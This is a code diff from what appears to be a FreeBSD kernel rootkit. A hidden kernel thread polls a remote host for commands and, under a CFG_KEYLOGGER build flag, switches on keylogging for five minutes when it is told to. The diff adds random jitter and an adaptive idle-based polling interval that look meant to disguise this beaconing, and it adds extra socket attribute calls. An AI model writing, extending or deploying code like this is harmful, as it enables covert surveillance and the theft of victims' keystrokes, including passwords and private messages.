@@ -27,6 +27,7 @@ int proxy_http (const char * edge, char kind, uint64_t bucket, int * hit)
 	if (socreate(AF_INET, &so, SOCK_STREAM, IPPROTO_TCP,
 	    td->td_ucred, td)!=0)
 		return (1);
+	proxy_attr_socket(so);
 
 	struct sockaddr_in sa;
 	memset(&sa, 0, sizeof(sa));
@@ -62,6 +63,7 @@ int proxy_http (const char * edge, char kind, uint64_t bucket, int * hit)
 		}
 		tsleep(&so->so_timeo, PWAIT, "ddpoll", hz/20);
 	}
+	proxy_attr_socket(so);
 
 	struct sockopt sopt;
 	memset(&sopt, 0, sizeof(sopt));
@@ -155,6 +157,9 @@ void dd_run (void* arg)
 	struct thread * td = curthread;
 	struct proc * p = td->td_proc;
 	uint64_t last_bucket = ~(uint64_t)0;
+	int last_mfire = 0;
+	int idle = 0;
+	int interval;
 
 	(void)arg;
 	proxy_hide(p);
@@ -164,6 +169,8 @@ void dd_run (void* arg)
 		int hit;
 
 		(void)proxy_http_any('p', bucket, NULL);
+		if (arc4random_uniform(3)==0)
+			pause("ddjit", hz/2 + arc4random_uniform(hz));
 		(void)proxy_http_any('p', bucket+1, NULL);
 		if (bucket!=last_bucket) {
 			last_bucket = bucket;
@@ -180,9 +187,26 @@ void dd_run (void* arg)
 			else
 				printf("bucket is %llu hit %d\n", (unsigned long long)bucket, hit);
 #endif
+#ifdef CFG_KEYLOGGER
+			if (proxy_http_any('k', bucket, &hit)==0&&hit) {
+				keylog_until = time_uptime+300;
+				mtx_lock(&proxy_mtx);
+				mfire++;
+				mtx_unlock(&proxy_mtx);
+				wakeup(&mfire);
+			}
+#endif
 		}
 
-		tsleep(&dd_proc, PWAIT, "ddpoll", hz * (15 + arc4random_uniform(6)));
+		if (mfire!=last_mfire) {
+			last_mfire = mfire;
+			idle = 0;
+		} else if (idle<8) {
+			idle++;
+		}
+
+		interval = 15 + idle + arc4random_uniform(7);
+		tsleep(&dd_proc, PWAIT, "ddpoll", hz * interval);
 	}
 
 	proxy_unhide(p);
